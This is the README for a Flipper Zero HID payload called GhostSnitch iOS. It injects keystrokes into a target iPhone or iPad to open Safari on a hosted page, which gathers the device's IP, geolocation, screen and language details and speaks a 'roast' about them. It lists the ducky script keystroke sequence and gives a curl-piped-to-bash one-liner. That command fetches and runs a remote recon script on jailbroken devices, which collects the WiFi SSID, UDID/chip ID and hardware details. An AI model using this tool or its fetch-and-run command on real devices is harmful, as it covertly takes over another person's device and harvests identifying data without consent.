# GhostSnitch iOS

**Version:** 1.1  
**Author:** I am TBJr  
**Platform:** iOS / iPadOS (Safari) · Jailbroken devices (shell)  
**Delivery:** Flipper Zero HID

---

## What it does

Opens Safari on the target device, navigates to a hosted HTML page, and delivers a roast using device info gathered from browser APIs. A separate shell script is available for jailbroken devices with additional recon capabilities.

---

## Files

| File | Purpose |
|---|---|
| `GhostSnitch_iOS.txt` | Flipper Zero ducky script |
| `host/ghostsnitch_ios.html` | Web-based payload (primary — works on all devices) |
| `host/ghostsnitch_ios.sh` | Shell script for jailbroken devices |

---

## Web payload (primary)

The HTML page gathers data via browser APIs and speaks a roast via the Web Speech API.

**Important — tap required:** The page shows a **"Tap to Continue"** button when it loads. The target must tap it once. iOS Safari blocks `speechSynthesis.speak()` without a prior user gesture — this cannot be bypassed from a web page.

**API availability in iOS Safari:**

| API | Available | Notes |
|---|---|---|
| User-Agent parsing | ✓ | iOS version + device family (iPhone/iPad/iPod) |
| `deviceMemory` | — | Intentionally absent from Safari (Apple privacy decision) |
| `navigator.getBattery()` | — | Removed from Safari; handled gracefully |
| `navigator.connection` | — | Network Information API not in Safari |
| `fetch` (IP lookup) | ✓ | `api.ipify.org` with `api4.my-ip.io` fallback |
| `geolocation` | ✓ | Requires user permission dialog |
| `screen.width/height` | ✓ | Reports CSS (logical) pixels; physical = CSS × `devicePixelRatio` |
| `navigator.languages` | ✓ | Language list |
| Web Speech API | ✓* | *Requires user gesture — handled by tap gate |

---

## Ducky script flow

```
1. GUI SPACE   → Spotlight search (Cmd+Space — works on iPhone and iPad with external keyboard)
2. STRING safari
3. ENTER        → open Safari
4. GUI l        → CMD+L — focus Safari address bar  ← required; without this the URL is not entered
5. STRING <url>
6. ENTER
```

**Important:** iOS shows a **"Trust this accessory?"** dialog the first time a USB HID device is connected. The target must tap "Trust" before any keystrokes are accepted. Plan for this in timing.

---

## Jailbroken device path (optional)

`ghostsnitch_ios.sh` provides additional recon not available via the browser:

| Feature | Method |
|---|---|
| iOS version | `sw_vers` → `defaults read SystemVersion.plist` → `uname -r` |
| Device model | `sysctl -n hw.model` (returns e.g. `iPhone14,3`) |
| RAM | `sysctl -n hw.memsize` |
| Battery % | `ioreg -l` → `CurrentCapacity / MaxCapacity` (replaces Linux `/sys/class/power_supply` path) |
| WiFi SSID | `networksetup` → `/usr/sbin/airport` → airport preferences plist |
| Chip ID / UDID | `ioreg -l` → `UniqueChipID` → `system_profiler` fallback |

Requirements: jailbroken device, shell access (SSH or NewTerm), `bash` and `curl` installed (via Procursus/Sileo or Cydia).

```bash
bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.sh)"
```

---

## Known limitations

- **Battery and Network Information APIs are absent from Safari** — these are Apple privacy decisions, not bugs. The page shows a clear "Not available" label for both.
- **Device model** is not exposed in the iOS Safari User-Agent string — only the device family (iPhone/iPad/iPod) can be detected. Screen resolution and pixel ratio help narrow down the generation.
- **Spotlight** may open a web search result instead of the Safari app on some configurations — a longer `DELAY` after `ENTER` or a second `ENTER` may help.
- **CMD+L** focuses the address bar on iOS 16+ with an external keyboard. Older iOS versions may require tapping the address bar manually.
- Jailbreak penetration is under 1% of the iOS install base — `ghostsnitch_ios.sh` is a niche path.

---

## Credits

Based on the original GhostSnitch for Windows. Reimagined for iOS by **TBJr**.
